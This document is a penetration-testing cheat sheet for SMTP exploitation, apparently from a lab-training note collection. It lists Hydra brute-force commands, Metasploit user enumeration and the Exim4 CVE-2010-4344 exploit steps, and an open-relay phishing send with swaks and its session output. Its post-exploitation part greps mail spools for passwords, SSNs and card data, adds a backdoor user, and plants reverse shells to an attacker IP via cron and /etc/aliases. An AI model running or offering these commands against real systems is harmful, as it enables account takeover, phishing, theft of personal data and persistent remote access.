---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SMTP/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Brute Force {{{-->
## Brute Force

Brute force SMTP authentication credentials using various tools

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
<!-- }}} -->

[[Hydra]] — Brute force with user

```sh
hydra -l <user>@$target -P <password_list> smtp://$target:587
```

[[Hydra]] — Brute force with username list

```sh
hydra -L <user_list> -P <password_list> smtp://$target:587
```

[[Metasploit]] — SMTP User Enumeration Utility

```sh
use auxiliary/scanner/smtp/smtp_enum
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> search smtp
> ```
>
> ```sh
> use auxiliary/scanner/smtp/smtp_enum
> ```
>
> ```sh
> set RHOSTS $target
> ```
>
> ```sh
> run
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

<!-- CVE-2010-4344 {{{-->
### CVE-2010-4344

[[Metasploit]] — Exim4 string_format Function Heap Buffer Overflow
(*[exim4_string_format](https://www.rapid7.com/db/modules/exploit/unix/smtp/exim4_string_format/)*)

```sh
use exploit/unix/smtp/exim4_string_format
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Launch Metasploit|Launch Metasploit]]
>
> 2. [[Metasploit#Select Exploit|Select Exploit]]
>
> ```sh
> use exploit/unix/smtp/exim4_string_format
> ```
>
> 3. Show possible targets
>
> ```sh
> show targets
> ```
>
> 4. Set target
>
> ```sh
> set TARGET <target_id>
> ```
>
> 5. [[Metasploit#Show Options|Show Options]]
>
> ```sh
> show options
> ```
>
> 6. [[Metasploit#Set Options|Set Options]]
>
> 7. [[Metasploit#Check Exploit|Check Exploit]]
>
> 8. [[Metasploit#Run Exploit|Run Exploit]]
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Open Relay Attack {{{-->
## Open Relay Attack

Test SMTP server for open relay vulnerabilities
[[General#Open Relay Configuration|Open Relay Configuration]]
that allow unauthorized email forwarding

[swaks](https://github.com/jetmore/swaks) —
Exploit Open Relay

```sh
swaks --from <relay_email> \
      --to <target_emails> \
      --header 'Subject: <subject>' \
      --body '<body>' \
      --server <server_ip>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> swaks --from notifications@inlanefreight.com \
>       --to employees@inlanefreight.com \
>       --header 'Subject: Company Notification' \
>       --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' \
>       --server 10.10.11.213
> ```
>
> ```sh
> === Trying 10.10.11.213:25...
> === Connected to 10.10.11.213.
> <-  220 mail.localdomain SMTP Mailer ready
>  -> EHLO parrot
> <-  250-mail.localdomain
> <-  250-SIZE 33554432
> <-  250-8BITMIME
> <-  250-STARTTLS
> <-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
> <-  250 HELP
>  -> MAIL FROM:<notifications@inlanefreight.com>
> <-  250 OK
>  -> RCPT TO:<employees@inlanefreight.com>
> <-  250 OK
>  -> DATA
> <-  354 End data with <CR><LF>.<CR><LF>
>  -> Date: Thu, 29 Oct 2020 01:36:06 -0400
>  -> To: employees@inlanefreight.com
>  -> From: notifications@inlanefreight.com
>  -> Subject: Company Notification
>  -> Message-Id: <20201029013606.775675@parrot>
>  -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
>  ->
>  -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
>  ->
>  ->
>  -> .
> <-  250 OK
>  -> QUIT
> <-  221 Bye
> === Connection closed with remote host.
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Search for [[Secrets]]

```sh
grep -r -i "password\|secret\|confidential" /var/mail/
```

Extract attachments

```sh
find /var/mail/ -name "*.pdf" -o -name "*.doc" -o -name "*.xls"
```

Extract e-mail addresses

```sh
grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' /var/mail/*
```

Extract financial information

```sh
grep -r -i "account\|routing\|ssn\|credit" /var/mail/
```

<!-- Email Harvesting {{{-->
### Email Harvesting

Read mail spool

```sh
cat /var/mail/<username>
```

```sh
cat /var/spool/mail/<username>
```

Maildir Format

```sh
ls -la /home/username/Maildir/cur/
```

```sh
cat /home/username/Maildir/cur/*
```

<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Add backdoor user to mail system

```sh
useradd -m -s /bin/bash <user>
```
```sh
echo "<user>:<password>" | chpasswd
```

Create cron job

```sh
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'" | crontab -
```

Modify mail aliases

```sh
echo "backdoor: |/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'" >> /etc/aliases
newaliases
```

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
